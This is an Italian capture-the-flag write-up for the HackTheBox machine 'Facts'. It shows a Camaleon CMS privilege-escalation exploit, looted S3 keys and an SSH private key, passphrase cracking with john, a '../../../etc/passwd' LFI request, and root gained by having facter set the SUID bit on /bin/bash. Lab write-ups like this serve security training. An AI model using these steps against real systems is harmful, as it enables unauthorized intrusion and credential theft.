<img src="facts.png" alt="facts" width="200" style="border-radius: 50%;">

# Facts - HackTheBox Writeup

> **Difficulty:** Easy &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Season:** 10 - Underground &nbsp;|&nbsp; **Date:** 01 Mar 2026

---

## 📋 Enumeration

### Nmap

```bash
nmap -p1-1000 -sV -oN nmap.txt 10.129.8.62
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open  http    nginx 1.26.3 (Ubuntu)
```

Due porte aperte. Si parte dall'applicazione web su porta 80.

### Web

Navigando su `http://facts.htb` si trova un sito di trivia. Enumerando i path si scopre il pannello di amministrazione su `/admin`.

Creando un account fake ed effettuando il login, si identifica il CMS in uso:

```
Camaleon CMS - Version 2.9.0
```

---

## 🗡️ Exploitation - CVE-2025-2304

Cercando su GitHub si trova **CVE-2025-2304**, una vulnerabilità di privilege escalation nel CMS che permette di elevare un account utente a ruolo admin.

```bash
python3 CVE.py http://facts.htb -u <user> -p <password>
```

Il nostro account viene promosso ad **admin** sul pannello CMS.

---

## 🛠️ Lateral Movement - AWS S3 Misconfiguration

Dal pannello admin si recuperano le credenziali per un bucket S3 interno:

```
Access Key : AKIA7228E98888A4F882
Secret Key : 3Xt4XcCoYkRcQ22y6pU5QQ13d5AXYRW2XmJUNk0Q
Endpoint   : http://facts.htb:54321
```

Si configura la AWS CLI e si esplora il bucket `internal`:

```bash
aws configure
# inserire le credenziali sopra, region: us-east-1

aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321
```

```
PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .profile
```

La cartella `.ssh` è esposta. Si scarica la chiave privata:

```bash
aws s3 ls   s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
# id_ed25519, authorized_keys

aws s3 cp s3://internal/.ssh/id_ed25519 ./ --endpoint-url http://facts.htb:54321
```

### Crack della passphrase

La chiave è protetta da passphrase. Si usa `ssh2john` + `john`:

```
ssh2john id_ed25519 > hash
john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

> **Passphrase trovata:** `dragonballz`

### Username via LFI

Il pannello admin espone una LFI nel download dei media privati:

```
GET /admin/media/download_private_file?file=../../../etc/passwd
```

L'utente di interesse è **`trivia`**.

---

## Trivia login

```bash
ssh -i id_ed25519 trivia@facts.htb
# passphrase: dragonballz
```

---

## 🪜 Privilege Escalation - facter SUID abuse

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` supporta fact custom in Ruby tramite `--custom-dir`. Si sfrutta per impostare il **SUID bit su `/bin/bash`**:

```
mkdir -p /tmp/trivia
echo 'Facter.add(:pwn) do setcode { system("chmod +s /bin/bash") } end' > /tmp/trivia/root.rb

sudo /usr/bin/facter --custom-dir=/tmp/trivia/ pwn

bash -p
```
---

## 🎓 Lessons Learned

| # | Takeaway |
|---|----------|
| 1 | Cercare sempre la versione del CMS - i CVE recenti spesso colpiscono versioni di poco aggiornate |
| 2 | I bucket S3 interni mal configurati possono esporre dati sensibili come chiavi SSH |
| 3 | Una LFI sul pannello admin è sufficiente per ricavare username validi da `/etc/passwd` |
| 4 | Controllare sempre `sudo -l` - binari come `facter` con `--custom-dir` sono facilmente abusabili |
